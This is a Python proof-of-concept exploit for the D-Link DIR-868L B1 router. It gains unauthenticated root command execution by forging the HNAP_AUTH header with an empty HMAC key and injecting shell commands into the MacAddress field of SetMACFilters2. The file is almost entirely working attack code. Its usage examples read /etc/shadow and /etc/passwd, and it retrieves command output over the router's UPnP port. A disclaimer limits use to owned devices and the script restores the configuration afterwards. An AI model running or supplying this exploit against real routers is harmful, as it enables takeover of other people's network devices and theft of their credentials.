#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DIR-868L B1 (FW 2.03b01) -- zero-credential root RCE via HNAP SetMACFilters2
PoC ID: DIR868L-MACF-RCE

Vulnerability
-------------
HNAP `SetMACFilters2` stores the request-body <MacAddress> value verbatim in
`/acl/macctrl/entry:N/mac` (the fatlady MACCTRL validator is only used by the
legacy postxml/hedwig path).  The action then runs `service MACCTRL restart`;
servd/svchlper renders `/etc/services/IPTMACCTRL.php` into
`/var/servd/IPTMACCTRL_start.sh` and executes it as root:

    iptables -A MACF.LAN-x -m mac --mac-source <MacAddress> -j LOG
    iptables -A MACF.LAN-x -m mac --mac-source <MacAddress> -j DROP

The value is unquoted, so
    MacAddress = 00:11:22:33:44:55;<command>;#
runs <command> as root.  `Enabled=true` + `IsAllowList=false` selects the DROP
branch.  The whole chain is reachable with zero credentials: any Cookie
`uid=` creates a session with an empty PrivateKey, and
HNAP_AUTH = upper(HMAC_MD5(key="", ts + raw SOAPAction)) is accepted.

Command output is redirected to the writable ramfs directory
`/var/htdocs/upnp/LAN-1/` and fetched from TCP/49152.

Usage
-----
  python3 poc_DIR868L_MACF_RCE.py --192.168.0.1 --check
  python3 poc_DIR868L_MACF_RCE.py --192.168.0.1 \
      'cat /proc/self/status; uname -a; cat /etc/passwd; cat /etc/shadow'
  python3 poc_DIR868L_MACF_RCE.py --192.168.0.1 --cmd 'uname -a'
  python3 poc_DIR868L_MACF_RCE.py 192.168.0.1 'cat /etc/shadow'

Safety
------
The PoC reads the current MAC filter configuration (GetMACFilters2), saves it,
performs the injection with the DROP policy and then **restores the exact
baseline** (Enabled / IsAllowList / MACList) and verifies it.  The evidence
file remains in /var/htdocs/upnp/LAN-1 (ramfs) unless `--clean` is used.
No reboot, factory reset, firmware write or persistent account is performed.
This is for authorized testing on devices you own.
"""

import argparse
import hashlib
import hmac
import http.client
import json
import random
import re
import socket
import sys
import time
import urllib.request
from html import unescape
from xml.sax.saxutils import escape

POC_ID = "DIR868L-MACF-RCE"
NS = "http://purenetworks.com/HNAP1/"
ACTION_GET = NS + "GetMACFilters2"
ACTION_SET = NS + "SetMACFilters2"
WEB_DIR = "/var/htdocs/upnp/LAN-1"
DEFAULT_PORT = 80
DEFAULT_FETCH_PORT = 49152

_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def log(msg):
    sys.stderr.write("[%s] %s\n" % (POC_ID, msg))


def normalize_argv(argv):
    out = []
    ip_re = re.compile(r"^--(\d{1,3}(?:\.\d{1,3}){3})$")
    for a in argv:
        m = ip_re.match(a)
        if m:
            out.extend(["--target", m.group(1)])
        else:
            out.append(a)
    return out


def make_uid():
    return "m%08x" % random.getrandbits(32)


def make_mark():
    return "d868mac_%08x.gif" % random.getrandbits(32)


class Hnap:
    def __init__(self, host, port=80, timeout=20.0, uid=None):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.uid = uid or make_uid()

    def auth(self, action, ts=None):
        # The verified physical requests use a quoted SOAPAction header and
        # HMAC over ts + '"' + action + '"'.  Keep that exact shape.
        ts = ts or str(int(time.time()))
        digest = hmac.new(b"", (ts + '"' + action + '"').encode(),
                          hashlib.md5).hexdigest().upper()
        return digest + " " + ts

    def request(self, action, body):
        body = body.encode()
        head = ("POST /HNAP1/ HTTP/1.1\r\n"
                "Host: %s\r\n"
                "Content-Type: text/xml; charset=utf-8\r\n"
                "Content-Length: %d\r\n"
                "SOAPAction: \"%s\"\r\n"
                "HNAP_AUTH: %s\r\n"
                "Cookie: uid=%s\r\n"
                "Connection: close\r\n\r\n"
                % (self.host, len(body), action, self.auth(action), self.uid)).encode()
        s = socket.socket()
        s.settimeout(self.timeout)
        try:
            s.connect((self.host, self.port))
            s.sendall(head + body)
            data = b""
            while True:
                try:
                    chunk = s.recv(8192)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
        finally:
            s.close()
        return data.decode("utf-8", "replace")

    def get_macfilters(self):
        body = ('<?xml version="1.0" encoding="utf-8"?>'
                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
                'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body><GetMACFilters2 xmlns="%s"></GetMACFilters2>'
                '</soap:Body></soap:Envelope>' % NS)
        text = self.request(ACTION_GET, body)
        if "<GetMACFilters2Result>OK</GetMACFilters2Result>" not in text:
            raise RuntimeError("GetMACFilters2 failed: %r" % text[:400])
        enabled = re.search(r"<Enabled>(.*?)</Enabled>", text, re.S)
        allow = re.search(r"<IsAllowList>(.*?)</IsAllowList>", text, re.S)
        entries = []
        raw_infos = []
        for m in re.finditer(r"<MACInfo>(.*?)</MACInfo>", text, re.S):
            block = m.group(1)
            raw_infos.append("<MACInfo>%s</MACInfo>" % block)
            mac = re.search(r"<MacAddress>(.*?)</MacAddress>", block, re.S)
            name = re.search(r"<DeviceName>(.*?)</DeviceName>", block, re.S)
            if mac:
                entries.append((unescape(mac.group(1).strip()),
                                unescape(name.group(1).strip()) if name else ""))
        return {
            "raw": text,
            "enabled": (enabled.group(1).strip().lower() if enabled else "false"),
            "allow": (allow.group(1).strip().lower() if allow else "false"),
            "entries": entries,
            "raw_infos": raw_infos,
        }

    def set_macfilters(self, enabled, allow, infos):
        """infos is a list of raw <MACInfo>...</MACInfo> XML strings.
        For convenience a list of (mac, name) tuples is also accepted."""
        if infos and isinstance(infos[0], tuple):
            infos = ["<MACInfo><MacAddress>%s</MacAddress>"
                     "<DeviceName>%s</DeviceName></MACInfo>"
                     % (escape(mac), escape(name or "macf-poc"))
                     for mac, name in infos]
        inner = ("<Enabled>%s</Enabled><IsAllowList>%s</IsAllowList>"
                 "<MACList>%s</MACList>" % (enabled, allow, "".join(infos)))
        body = ('<?xml version="1.0" encoding="utf-8"?>'
                '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
                'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                '<soap:Body><SetMACFilters2 xmlns="%s">%s</SetMACFilters2>'
                '</soap:Body></soap:Envelope>' % (NS, inner))
        return self.request(ACTION_SET, body)


def build_mac_payload(cmd, mark):
    if not cmd.strip():
        raise ValueError("empty command")
    cmd = cmd.replace("\r", ";").replace("\n", ";").strip()
    parts = [p.strip() for p in cmd.split(";") if p.strip()]
    if not parts:
        raise ValueError("empty command")
    out_path = "%s/%s" % (WEB_DIR, mark)
    pieces = []
    for i, part in enumerate(parts):
        redir = ">" if i == 0 else ">>"
        pieces.append(part + redir + out_path)
    value = "00:11:22:33:44:55;" + ";".join(pieces) + ";#"
    if len(value) > 1800:
        raise ValueError("command/MacAddress too long (%d bytes)" % len(value))
    return value, out_path


def fetch(target, port, mark, timeout):
    url = "http://%s:%d/%s" % (target, port, mark)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with _opener.open(url, timeout=4) as r:
                if r.status == 200:
                    return r.read(), url
        except Exception:
            pass
        time.sleep(0.8)
    return None, url


def verify_restore(hnap, baseline):
    after = hnap.get_macfilters()
    ok = (after["enabled"] == baseline["enabled"] and
          after["allow"] == baseline["allow"] and
          sorted(after["entries"]) == sorted(baseline["entries"]))
    return ok, after


def main():
    argv = normalize_argv(sys.argv[1:])
    ap = argparse.ArgumentParser(
        description="%s - DIR-868L B1 2.03b01 zero-cred HNAP SetMACFilters2 RCE" % POC_ID,
        usage="%(prog)s [--target] <target-ip> <command...>")
    ap.add_argument("--target", dest="target_opt", help="router IP")
    ap.add_argument("--cmd", dest="cmd_opt", help="command to run as root")
    ap.add_argument("rest", nargs=argparse.REMAINDER, help=argparse.SUPPRESS)
    ap.add_argument("--check", action="store_true", help="read and print the current MAC filter config only")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--fetch-port", type=int, default=DEFAULT_FETCH_PORT)
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--clean", action="store_true", help="remove the evidence file via a second injection")
    ap.add_argument("--raw", action="store_true")
    ap.add_argument("--out", help="save fetched bytes to this local file")
    ap.add_argument("--baseline-out", help="save the baseline JSON to this local file")
    args = ap.parse_args(argv)

    rest = list(args.rest)
    for flag, attr in (("--check", "check"), ("--clean", "clean"),
                       ("--raw", "raw")):
        while flag in rest:
            setattr(args, attr, True)
            rest.remove(flag)

    target = args.target_opt
    if target is None:
        if not rest:
            ap.error("target IP is required")
        target = rest.pop(0)
    if args.cmd_opt is not None:
        if rest:
            ap.error("give the command either with --cmd or positionally, not both")
        cmd = args.cmd_opt
    else:
        cmd = " ".join(rest)
    if not cmd and not args.check:
        ap.error("a command is required (use --check to read the baseline)")

    hnap = Hnap(target, args.port, args.timeout)
    try:
        baseline = hnap.get_macfilters()
    except Exception as exc:
        log("cannot reach http://%s:%d/HNAP1/ (%s)" % (target, args.port, exc))
        return 2
    log("baseline: Enabled=%s IsAllowList=%s entries=%r"
        % (baseline["enabled"], baseline["allow"], baseline["entries"]))
    if args.baseline_out:
        with open(args.baseline_out, "w") as f:
            json.dump({"enabled": baseline["enabled"], "allow": baseline["allow"],
                       "entries": baseline["entries"],
                       "raw_infos": baseline["raw_infos"], "raw": baseline["raw"]},
                      f, indent=2)
        log("baseline saved to %s" % args.baseline_out)
    if args.check:
        print(baseline["raw"])
        return 0

    mark = make_mark()
    try:
        mac_value, out_path = build_mac_payload(cmd, mark)
    except ValueError as exc:
        log("invalid command: %s" % exc)
        return 2

    log("injecting MacAddress=%s" % mac_value)
    restored = False
    try:
        inject_info = ("<MACInfo><MacAddress>%s</MacAddress>"
                       "<DeviceName>macf-poc</DeviceName></MACInfo>" % escape(mac_value))
        resp = hnap.set_macfilters("true", "false", [inject_info])
        if "<SetMACFilters2Result>OK</SetMACFilters2Result>" not in resp:
            log("injection SetMACFilters2 did not return OK: %r" % resp[:400])
            return 1
        log("injection accepted; waiting for servd/MACCTRL restart")

        body, url = fetch(target, args.fetch_port, mark, args.timeout)
        if body is None:
            log("no evidence at %s within %.0fs" % (url, args.timeout))
            return 1
        log("evidence: %d byte(s) from %s" % (len(body), url))
        if args.out:
            with open(args.out, "wb") as f:
                f.write(body)
            log("saved to %s" % args.out)
        if args.raw:
            sys.stdout.buffer.write(body)
            sys.stdout.buffer.flush()
        else:
            text = body.decode("utf-8", "replace")
            sys.stdout.write(text)
            if text and not text.endswith("\n"):
                sys.stdout.write("\n")
            sys.stdout.flush()

        if args.clean:
            cleanup_mac = "00:11:22:33:44:55;rm -f %s;#" % out_path
            log("cleanup: second injection to remove %s" % out_path)
            cleanup_info = ("<MACInfo><MacAddress>%s</MacAddress>"
                            "<DeviceName>macf-clean</DeviceName></MACInfo>" % escape(cleanup_mac))
            hnap.set_macfilters("true", "false", [cleanup_info])
            time.sleep(2)
    finally:
        # Always restore the exact baseline, even if the fetch failed.
        try:
            hnap.set_macfilters(baseline["enabled"], baseline["allow"], baseline["raw_infos"])
            ok, after = verify_restore(hnap, baseline)
            restored = ok
            log("restore: %s (Enabled=%s IsAllowList=%s entries=%r)"
                % ("OK" if ok else "MISMATCH", after["enabled"], after["allow"], after["entries"]))
        except Exception as exc:
            log("restore failed: %s" % exc)

    if not restored:
        log("WARNING: baseline restore could not be verified")
        return 3
    return 0


if __name__ == "__main__":
    sys.exit(main())
